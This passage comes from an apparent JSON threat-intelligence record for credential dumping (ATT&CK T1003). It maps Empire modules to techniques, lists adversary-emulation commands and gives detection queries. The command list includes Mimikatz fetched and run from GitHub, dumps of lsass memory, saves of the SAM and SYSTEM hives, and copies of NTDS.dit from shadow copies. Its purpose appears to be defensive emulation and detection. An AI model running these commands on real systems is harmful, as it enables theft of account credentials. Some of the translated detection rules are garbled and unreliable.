for Python Dictionary": "\"powershell/management/downgrade_account\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/wdigest_downgrade", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/management/wdigest_downgrade\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/gpp", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/privesc/gpp\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/mcafee_sitelist", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/privesc/mcafee_sitelist\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/hashdump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/collection/linux/hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/mimipenguin", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/collection/linux/mimipenguin\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/hashdump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/collection/osx/hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/kerberosdump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/collection/osx/kerberosdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/management/multi/kerberos_inject", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/management/multi/kerberos_inject\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/etcd_crawler", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/etcd_crawler\":  [\"T1003\"],"}}], "command_list": ["hashdump\nmimikatz !lsadump::sam", "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump", "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords", "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n", "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n", "#{gsecdump_exe} -a\n", "#{gsecdump_exe} -a\n", "#{wce_exe} -o %temp%\\wce-output.txt\n", "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "#{wce_exe} -o #{output_file}\n", "#{wce_exe} -o #{output_file}\n", "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "#{procdump_exe} -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "PathToAtomicsFolder\\T1003\\bin\\procdump.exe -accepteula -ma lsass.exe #{output_file}\n", "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe\n", "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "#{mimikatz_exe} \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n", "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\" q q\n", "vssadmin.exe create shadow /for=C:\n", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n", "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", ". #{gpp_script_path}\nGet-GPPPassword -Verbose\n", "pypykatz live lsa\n", "pypykatz live registry\n", {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payloads": ["powerview.ps1"]}}}, {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payloads": ["totallylegit.exe"]}}}, {"windows": {"psh": {"command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.ntlm"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.sha1"}]}, "payloads": ["invoke-mimi.ps1"]}}}, {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}, {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}}}}, "ntdsutil.exe", "HKLM\\SAM|HKLM\\Security\\\\Windows\\\\.+\\\\lsass.exe", "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "powershell/collection/ChromeDump", "powershell/collection/ChromeDump", "powershell/collection/FoxDump", "powershell/collection/FoxDump", "powershell/collection/ninjacopy", "powershell/collection/ninjacopy", "powershell/collection/vaults/add_keepass_config_trigger", "powershell/collection/vaults/add_keepass_config_trigger", "powershell/collection/vaults/find_keepass_config", "powershell/collection/vaults/find_keepass_config", "powershell/collection/vaults/get_keepass_config_trigger", "powershell/collection/vaults/get_keepass_config_trigger", "powershell/collection/vaults/keethief", "powershell/collection/vaults/keethief", "powershell/collection/vaults/remove_keepass_config_trigger", "powershell/collection/vaults/remove_keepass_config_trigger", "powershell/credentials/enum_cred_store", "powershell/credentials/enum_cred_store", "powershell/credentials/mimikatz/cache", "powershell/credentials/mimikatz/cache", "powershell/credentials/mimikatz/command", "powershell/credentials/mimikatz/command", "powershell/credentials/mimikatz/dcsync", "powershell/credentials/mimikatz/dcsync", "powershell/credentials/mimikatz/dcsync_hashdump", "powershell/credentials/mimikatz/dcsync_hashdump", "powershell/credentials/mimikatz/extract_tickets", "powershell/credentials/mimikatz/extract_tickets", "powershell/credentials/mimikatz/golden_ticket", "powershell/credentials/mimikatz/golden_ticket", "powershell/credentials/mimikatz/logonpasswords", "powershell/credentials/mimikatz/logonpasswords", "powershell/credentials/mimikatz/lsadump", "powershell/credentials/mimikatz/lsadump", "powershell/credentials/mimikatz/mimitokens", "powershell/credentials/mimikatz/mimitokens", "powershell/credentials/mimikatz/sam", "powershell/credentials/mimikatz/sam", "powershell/credentials/mimikatz/silver_ticket", "powershell/credentials/mimikatz/silver_ticket", "powershell/credentials/mimikatz/trust_keys", "powershell/credentials/mimikatz/trust_keys", "powershell/credentials/powerdump", "powershell/credentials/powerdump", "powershell/credentials/vault_credential", "powershell/credentials/vault_credential", "powershell/management/downgrade_account", "powershell/management/downgrade_account", "powershell/management/wdigest_downgrade", "powershell/management/wdigest_downgrade", "powershell/privesc/gpp", "powershell/privesc/gpp", "powershell/privesc/mcafee_sitelist", "powershell/privesc/mcafee_sitelist", "python/collection/linux/hashdump", "python/collection/linux/hashdump", "python/collection/linux/mimipenguin", "python/collection/linux/mimipenguin", "python/collection/osx/hashdump", "python/collection/osx/hashdump", "python/collection/osx/kerberosdump", "python/collection/osx/kerberosdump", "python/management/multi/kerberos_inject", "python/management/multi/kerberos_inject", "python/situational_awareness/network/dcos/etcd_crawler", "python/situational_awareness/network/dcos/etcd_crawler", "Dos\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / start\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Signal sent to start the VSS service.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / create c\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Attempting to create a shadow copy.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / list\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\nSHADOW COPIES\n=============\n\n[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n[*] Client accessible: True\n[*] Count: 1\n[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1\n[*] Differential: True\n[*] Exposed locally: False\n[*] Exposed name:\n[*] Exposed remotely: False\n[*] Hardware assisted: False\n[*] Imported: False\n[*] No auto release: True\n[*] Not surfaced: False\n[*] No writers: True\n[*] Originating machine: ICBC.abcc.org\n[*] Persistent: True\n[*] Plex: False\n[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n[*] Service machine: ICBC.abcc.org\n[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n[*] State: 12\n[*] Transportable: False\n[*] Volume name:? \\\\ \\ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ ntds \\ ntds.dit C:? \\\nWe have copied a file.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / delete\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 7and (module_loaded contains \"C:\\\\Windows\\\\System32\\\\samlib.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\WinSCard.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\cryptdll.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\hid.dll\"or module_loaded contains \"C:\\\\Windows\\\\System32\\\\vaultcli.dll\")and (process_path !contains \"\\\\Sysmon.exe\"or process_path !contains \"\\\\svchost.exe\"or process_path !contains \"\\\\logonui.exe\")", "name": "Credential Dumping ImageLoad"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"Invoke-Mimikatz -DumpCreds\"or process_command_line contains \"gsecdump -a\"or process_command_line contains \"wce -o\"or process_command_line contains \"procdump -ma lsass.exe\"or process_command_line contains \"ntdsutil*ac i ntds*ifm*create full\")", "name": "Credential Dumping Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 10 and target_process_path contains \"C:\\\\Windows\\\\system32\\\\lsass.exe\"and (process_granted_access contains \"0x1010\"or process_granted_access contains \"0x1410\"or process_granted_access contains \"0x147a\"or process_granted_access contains \"0x143a\")and process_call_trace contains \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\"and process_call_trace contains \"C:\\\\Windows\\\\system32\\\\KERNELBASE.dll\"and process_call_trace contains \"|UNKNOWN(*)\"", "name": "Credential Dumping Process Access"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and process_path !contains \"C:\\\\WINDOWS\\\\system32\\\\lsass.exe\"and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Authentication\\\\Credential Provider\\\\\"or registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\\"or registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SecurityProviders\\\\\"or registry_key_path contains \"\\\\Control\\\\SecurityProviders\\\\WDigest\\\\\")and registry_key_path !contains \"\\\\Lsa\\\\RestrictRemoteSamEventThrottlingWindow\"", "name": "Credential Dumping Registry"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"reg.exe\"and (process_command_line contains \"*save*HKLM\\\\sam*\"or process_command_line contains \"*save*HKLM\\\\system*\")", "name": "Credential Dumping Registry Save"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: obtaining credentials based DCC2\ndescription: windows server 2008 simulation test results\nreferences: https://baijiahao.baidu.com/s?id=1611304657392579351\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0NewProcessname: '* \\ mimikatz.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: 'TokenElevationTypeFull (2)' # token type lifting\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4673 # privilege has been invoked service.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: '* \\ mimikatz.exe' # Process> Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Privilege: 'SeTcbPrivilege' # service request information> privilege: SeTcbPrivilege\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: VSS shadow copy Ntds.dit file read local (host OS control field, is also applicable to a VSS shadow copy remote read Ntds.dit file)\ndescription: windows server 2008 simulation test results\nreferences: https://1sparrow.com/2018/02/19/ infiltration associated domain /\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: sysmon\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'VSSADMIN.EXE'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CurrentDirectory: 'vssadmin create shadow / for = C:'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: 'C: \\ Windows \\ System32 \\ reg.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'reg.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CurrentDirectory: 'reg SAVE HKLM \\ SYSTEM *'\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'VSSADMIN.EXE'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CurrentDirectory: 'vssadmin delete shadows / all'\n\u00a0\u00a0\u00a0\u00a0condition: selection1 or selection2 or selection3\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: SPN service scans honeypot accounts\ndescription: 0day.org simulation test results\nreferences: https://adsecurity.org/?p=3458\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4769 # Kerberos service ticket was requested.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ServiceName: abcc # Service Information> Service Name (honeypot user account)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Clientaddress: :: ffff: * # Network Information> Client Address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Ticketoptions: 0x40810000 # Additional information> ticket information\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Ticketencryptiontype: 0x17 # Additional information> Ticket Encryption Type\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: win-vaultcmd obtain basic information system credentials\ndescription: windows server 2016\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security / Sysmon\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 4688 #windows security log, have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 1 #windows Sysmon log, create a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0New processname: C: \\ Windows \\ System32 \\ VaultCmd.exe # new process name / image\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Parent processname: C: \\ Windows \\ System32 \\ cmd.exe # creator Process Name / ParentImage\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Process commandline:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- vaultcmd / list # list the vault (vault) list\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- vaultcmd / listschema # listed vault (vault) a summary of the credentials name and GUID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- vaultcmd / listcreds: {*} # Chinese system, the list of all the credentials of the GUID} * {vault (Vault)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0All credential information under the \"*\" # English system, called the list \"*\" vault (vault): vaultcmd / listcreds -\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- vaultcmd / listproperties: {*} # Chinese system, as listed attributes GUID} * {vault (Vault), including the file location, the number of credentials included, protection method\n\u00a0\u00a0\u00a0\u00a0condition: selection", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Use vssown.vbs get NTDS.dit file\ndescription: windows server 2016+ AD domain controller\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0New processname: C: \\ Windows \\ System32 \\ cscript.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Process commandline:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / start # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / create c # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / delete # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / list # command line based detection\n\u00a0\u00a0\u00a0\u00a0condition: selection\n---\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4904 # has been trying to register a security event source.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source name: VSSAudit # Event Source\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 8222 # shadow copy has been created.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Process image name: C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Raw volume: \\\\ \\ Volume {*} \\ # \"*\" represents the regular match?\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Shadow device name: \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * # \"*\" represents the regular match?\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4905 # has been trying to unregister a security event source.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source name: VSSAudit # Event Source\n\u00a0\u00a0\u00a0\u00a0timeframe: last 10S # custom time range\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Use ntdsutil get NTDS.dit file\ndescription: windows server 2008 + AD domain controller\nreferences: https://blog.csdn.net/Fly_hps/article/details/80641987\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ntdsutil.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Application log file detection ntdsutil get NTDS.dit\ndescription: windows server 2008 + AD domain controller\nreferences: https://blog.csdn.net/Fly_hps/article/details/80641987\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: application\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2005\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Example shadow copy is starting. This will be a complete shadow copy. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2001\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Shadow copy instance freeze has begun. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2003\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Shadow copy instance freeze stopped. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2006\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Volume Shadow Copy instance completed successfully. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 300\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: lsass (*) The database engine is initialized recovery steps. On behalf of any value matches the number # *\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: triggering a large number of events during the 216 216 #\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) detects that the database location changed from: \"C \\ Windows \\ NTDS \\ ntds.dit\" is \"? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * 1 * \\ Windows \\ NTDS \\ ntds.dit\". * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 302\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) The database engine has successfully completed recovery steps. * # Represents any number 'value matches\ntimeframe: last 10S # custom time range\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: plaintext to obtain the voucher --Procdump\ndescription: windows server 2008 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: sysmon\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: '* \\ procdump * .exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Product: ProcDump\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0OriginalFileName: procdump\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'procdump * .exe 